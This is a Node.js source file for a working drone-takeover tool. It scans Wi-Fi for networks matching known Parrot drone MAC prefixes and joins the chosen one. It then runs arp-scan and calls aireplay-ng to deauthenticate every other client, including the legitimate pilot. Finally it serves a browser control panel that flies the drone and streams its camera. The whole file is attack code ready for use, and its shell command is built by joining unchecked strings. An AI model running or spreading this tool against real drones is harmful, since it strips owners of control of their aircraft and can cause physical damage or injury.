// Utils
var os = require("os");
var cp = require('child_process');
var commandExistsSync = require('command-exists').sync;
var path = require("path");
var prompt = require('prompt');
var wifi = require('node-wifi');
var arpscan = require('arpscan');

// App server
var express = require('express');
var app = express();
var http = require('http').Server(app);

app.use(express.static('public'));

// Requirements Checks
if (!commandExistsSync('arp-scan')) { console.log("Error : missing command 'arp-scan' please install it and retry"); process.exit(); }
if (!commandExistsSync('aireplay-ng')) { console.log("Error : missing command 'aireplay-ng' please install 'aircrack-ng' and retry"); process.exit(); }

// Init values, wifi, launch deauth attack, then init navigation app (step by step using promise)
var iface = process.argv[2] ? process.argv[2] : 'wlan0';
var target = null;
var attackMAC = null;
var scan_wifi = scanWifi();
var deauth = scan_wifi.then(launchDeauth);
var connect_wifi = deauth.then(connectWifi);

Promise.all([scan_wifi, deauth, connect_wifi]).then(values => {
  http.listen(3000, function() {
    console.log('Navigation control running at http://localhost:3000/');
  });

  initNavControl();
}, console.error);

/**
* Scan for drone wifi networks using MAC address prefixes and
* prompt to choose the one to target, then connects to it.
*/
function scanWifi() {
  return new Promise(function(resolve, reject) {
    // Check wifi interface
    var interfaces = os.networkInterfaces();
    if (interfaces[iface] === undefined) return reject("Error : " + iface + " interface not available");

    attackMAC = interfaces[iface][0].mac;
    console.log('Attack from interface ' + iface, attackMAC);

    var droneMacs = ['90:03:B7', 'A0:14:3D', '00:12:1C', '00:26:7E'];

    wifi.init({
      iface: iface
    });

    console.log("Scan available drone wifi...");
    // Scan networks
    wifi.scan(function(err, networks) {

      // Filter drone networks
      networks = networks.filter(function(e) {
        return droneMacs.indexOf(e.mac.substring(0, 8)) !== -1
      });

      if (networks.length < 1) return reject("Error : No drone networks available");

      console.log("Available drone wifi :");
      networks.forEach(function(e, i) {
        console.log("  " + i + ".  " + e.ssid);
      });

      var schema = {
        properties: {
          choice: {
            description: 'Choose target drone ssid ? (0)',
            default: 0,
            type: 'integer',
            message: 'Choice must be index of wifi',
            required: true
          }
        }
      };

      prompt.start();
      prompt.get(schema, function(err, result) {
        var choice = parseInt(result.choice);
        target = networks[choice];
        console.log('Connection to ' + target.mac + ' ...');
        wifi.connect({
          ssid: target.ssid
        }, function(err) {
          if (err) return reject(err);
          console.log('Connected');
          resolve();
        });
      });
    });
  })
}

/**
* Scan the drone network using 'arp-scan' and deauth clients that are not
* the drone or ourself
*/
function launchDeauth() {
  return new Promise(function(resolve, reject) {

    if (!target.mac) return reject("Error : Drone MAC address is missing");

    console.log('Scan network clients...');
    arpscan(onResult, {
      interface: iface
    });

    function onResult(err, clients) {
      if (err) return reject(err);

      var deauthTargets = clients.filter(function(client) {
        return client.mac != target.mac && client.mac != attackMAC
      });

      if (deauthTargets.length == 0){
        console.log("No Clients to deauth");
        resolve();
      } else{

        console.log(deauthTargets);

        //Confirm prompt before deauth
        var schema = {
          properties: {
            choice: {
              description: 'Disconnect ' + deauthTargets.length + ' clients ? (true,false)',
              default: false,
              type: 'boolean',
              message: 'Choice must be true or false',
              required: true
            }
          }
        };
        prompt.start();
        prompt.get(schema, function(err, result) {
          if (result.choice === true) {
            var deauthPromises = [];
            //For all targets create a deauth promise
            deauthTargets.forEach((client, i) => {
              var deauthPromise = new Promise((resolve, reject) => {
                console.log('Disconnecting : ' + client.mac);
                var exec = cp.exec;
                exec('aireplay-ng -0 3 -a ' + target.mac + ' -c ' + client.mac + ' ' + iface, function callback(err, stdout, stderr) {
                  if (err) return reject(err);
                  resolve();
                });
              });
              deauthPromises.push(deauthPromise);
            });

            //When all targets are deauth proceed
            Promise.all(deauthPromises).then(values => {
              resolve();
            }, reason => {
              console.error(reason);
            });
          }else{
            return reject("Deauth attack was cancel");
          }
        });
      }
    }
  })
}

/**
* Connect to target drone wifi
*/
function connectWifi() {
  return new Promise(function(resolve, reject) {
    console.log('Connection to ' + target.mac + ' ...');
    wifi.connect({
      ssid: target.ssid
    }, function(err) {
      if (err) return reject(err);
      console.log('Connected');
      resolve();
    });
  })
}

/**
* Init navigation app in browser
*/
function initNavControl() {
  var currentImg = null;
  var imageSendingPaused = false;

  app.get("/image/:id", function(req, res) {
    res.writeHead(200, {
      "Content-Type": "image/png"
    });
    return res.end(currentImg, "binary");
  });

  // Drone client
  var drone = require("ar-drone").createClient();
  drone.config('general:navdata_demo', 'TRUE');
  drone.animateLeds('blinkRed', 5, 2);

  // Socket
  var io = require('socket.io')(http);

  io.on('connection', function(socket) {
    console.log('a user connected');

    socket.on("move", function(cmd) {
      var _name;
      console.log("move", cmd);
      return typeof drone[_name = cmd.action] === "function" ? drone[_name](cmd.speed) : void 0;
    });
    socket.on("animate", function(cmd) {
      console.log('animate', cmd);
      return drone.animate(cmd.action, cmd.duration);
    });
    socket.on("command", function(cmd) {
      var _name;
      console.log('drone command: ', cmd);
      return typeof drone[_name = cmd.action] === "function" ? drone[_name]() : void 0;
    });
    drone.on('navdata', function(data) {
      return io.emit("navdata", data);
    });
    drone.createPngStream().on("data", function(frame) {
      currentImg = frame;
      if (imageSendingPaused) {
        return;
      }
      io.emit("image", "/image/" + (Math.random()));
      imageSendingPaused = true;
      return setTimeout((function() {
        return imageSendingPaused = false;
      }), 100);
    });

    socket.on('disconnect', function() {
      console.log('user disconnected');
    });
  });
}
